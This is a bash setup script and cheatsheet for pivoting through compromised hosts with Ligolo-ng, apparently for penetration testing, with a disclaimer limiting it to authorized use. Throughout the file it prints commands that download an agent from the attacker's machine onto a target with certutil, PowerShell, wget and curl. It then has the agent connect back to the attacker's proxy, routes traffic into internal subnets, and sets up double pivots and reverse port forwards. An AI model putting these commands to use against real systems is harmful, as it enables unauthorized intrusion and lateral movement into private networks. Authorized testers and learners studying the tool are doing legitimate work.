#!/bin/bash
#==============================================================================
# Ligolo-ng Pivot Setup Script
# Usage: ./ligolo-setup.sh <interface_name> [proxy_port]
# Author: Brad Turner
# DISCLAIMER: For authorized security testing only. Do not use against systems
# without explicit written permission. The author assumes no liability for
# misuse. You are responsible for compliance with all applicable laws.
#==============================================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

IFACE=${1:-"ligolo"}
PROXY_PORT=${2:-11601}

banner() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${GREEN}[*] $1${NC}"
    echo -e "${BLUE}========================================${NC}"
}

info() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
cmd() { echo -e "${CYAN}[CMD]${NC} $1"; }

banner "LIGOLO-NG PIVOT SETUP"

#------------------------------------------------------------------------------
# STEP 1: Create TUN Interface
#------------------------------------------------------------------------------
banner "STEP 1: CREATE TUN INTERFACE"

info "Creating tun interface: $IFACE"
echo ""
cmd "sudo ip tuntap add user $(whoami) mode tun $IFACE"
cmd "sudo ip link set $IFACE up"
echo ""

read -p "Create interface now? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    sudo ip tuntap add user "$(whoami)" mode tun "$IFACE" 2>/dev/null || warn "Interface may already exist"
    sudo ip link set "$IFACE" up
    info "Interface $IFACE created and up"
    ip addr show "$IFACE"
fi

#------------------------------------------------------------------------------
# STEP 2: Start Proxy
#------------------------------------------------------------------------------
banner "STEP 2: START LIGOLO PROXY (on Kali)"

KALI_IP=$(ip route get 1 | awk '{print $7; exit}')
info "Your Kali IP appears to be: $KALI_IP"
echo ""

warn "Download ligolo-ng from: https://github.com/nicocha30/ligolo-ng/releases"
echo ""
cmd "./proxy -selfcert -laddr 0.0.0.0:$PROXY_PORT"
echo ""
info "The proxy will listen for agent connections on port $PROXY_PORT"

#------------------------------------------------------------------------------
# STEP 3: Transfer Agent to Target
#------------------------------------------------------------------------------
banner "STEP 3: TRANSFER AGENT TO TARGET"

echo "=== Windows Agent ==="
cmd "certutil -urlcache -f http://$KALI_IP/agent.exe agent.exe"
cmd "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$KALI_IP/agent.exe','agent.exe')\""
cmd "powershell -c \"iwr http://$KALI_IP/agent.exe -OutFile agent.exe\""
echo ""
echo "=== Linux Agent ==="
cmd "wget http://$KALI_IP/agent -O /tmp/agent && chmod +x /tmp/agent"
cmd "curl http://$KALI_IP/agent -o /tmp/agent && chmod +x /tmp/agent"

#------------------------------------------------------------------------------
# STEP 4: Run Agent on Target
#------------------------------------------------------------------------------
banner "STEP 4: RUN AGENT ON TARGET"

echo "=== Windows ==="
cmd ".\\agent.exe -connect $KALI_IP:$PROXY_PORT -ignore-cert"
echo ""
echo "=== Linux ==="
cmd "./agent -connect $KALI_IP:$PROXY_PORT -ignore-cert"
echo ""
warn "The agent will connect back to your proxy"

#------------------------------------------------------------------------------
# STEP 5: Ligolo Proxy Commands
#------------------------------------------------------------------------------
banner "STEP 5: LIGOLO PROXY COMMANDS"

echo "Once agent connects, in the proxy console:"
echo ""
info "List sessions:"
cmd "session"
echo ""
info "Select session (e.g., session 1):"
cmd "session"
echo ">> Enter session number"
echo ""
info "View target's network interfaces:"
cmd "ifconfig"
echo ""
info "Start tunnel:"
cmd "start"
echo ""

#------------------------------------------------------------------------------
# STEP 6: Add Routes
#------------------------------------------------------------------------------
banner "STEP 6: ADD ROUTES TO INTERNAL NETWORK"

warn "After starting the tunnel, add routes on Kali:"
echo ""
echo "=== Common internal ranges ==="
cmd "sudo ip route add 10.0.0.0/8 dev $IFACE"
cmd "sudo ip route add 172.16.0.0/12 dev $IFACE"
cmd "sudo ip route add 192.168.0.0/16 dev $IFACE"
echo ""
echo "=== Or specific subnet (preferred) ==="
cmd "sudo ip route add 10.10.10.0/24 dev $IFACE"
cmd "sudo ip route add 172.16.50.0/24 dev $IFACE"
echo ""

read -p "Add route now? Enter subnet (e.g., 10.10.10.0/24) or 'n' to skip: " SUBNET
if [[ $SUBNET != "n" && -n $SUBNET ]]; then
    sudo ip route add "$SUBNET" dev "$IFACE"
    info "Route added: $SUBNET via $IFACE"
    ip route | grep "$IFACE"
fi

#------------------------------------------------------------------------------
# STEP 7: Double Pivot (if needed)
#------------------------------------------------------------------------------
banner "STEP 7: DOUBLE PIVOT (Target -> Target2 -> Internal)"

warn "For double pivots (reaching a third network):"
echo ""
echo "1. On first pivot host, run another agent connecting to YOUR Kali"
echo "2. On Kali, set up listener for second agent:"
cmd "listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:$PROXY_PORT --tcp"
echo ""
echo "3. On second pivot host (through first tunnel):"
cmd "./agent -connect FIRST_PIVOT_IP:11602 -ignore-cert"
echo ""
echo "4. New session appears in proxy, add routes for third network"

#------------------------------------------------------------------------------
# QUICK REFERENCE
#------------------------------------------------------------------------------
banner "QUICK REFERENCE CARD"

cat << 'EOF'
┌─────────────────────────────────────────────────────────────────┐
│                    LIGOLO-NG CHEATSHEET                         │
├─────────────────────────────────────────────────────────────────┤
│ KALI SETUP:                                                     │
│   sudo ip tuntap add user $USER mode tun ligolo                 │
│   sudo ip link set ligolo up                                    │
│   ./proxy -selfcert -laddr 0.0.0.0:11601                        │
│                                                                 │
│ TARGET (connect back):                                          │
│   ./agent -connect KALI_IP:11601 -ignore-cert                   │
│                                                                 │
│ PROXY COMMANDS:                                                 │
│   session           - list/select sessions                      │
│   ifconfig          - show target interfaces                    │
│   start             - start tunnel                              │
│   listener_add      - add port forward                          │
│   listener_list     - list port forwards                        │
│                                                                 │
│ ADD ROUTES (on Kali):                                           │
│   sudo ip route add 10.10.10.0/24 dev ligolo                    │
│                                                                 │
│ PORT FORWARDING (reverse):                                      │
│   listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp      │
│   (Access target's localhost:80 via Kali:8080)                  │
│                                                                 │
│ COMMON ISSUES:                                                  │
│   - Route not working? Check: ip route | grep ligolo            │
│   - Can't reach target? Try: ping through tunnel                │
│   - Multiple sessions? Select correct one before 'start'        │
└─────────────────────────────────────────────────────────────────┘
EOF

banner "SETUP COMPLETE"
info "Interface: $IFACE"
info "Proxy port: $PROXY_PORT"
warn "Don't forget to start the proxy and transfer agent to target!"
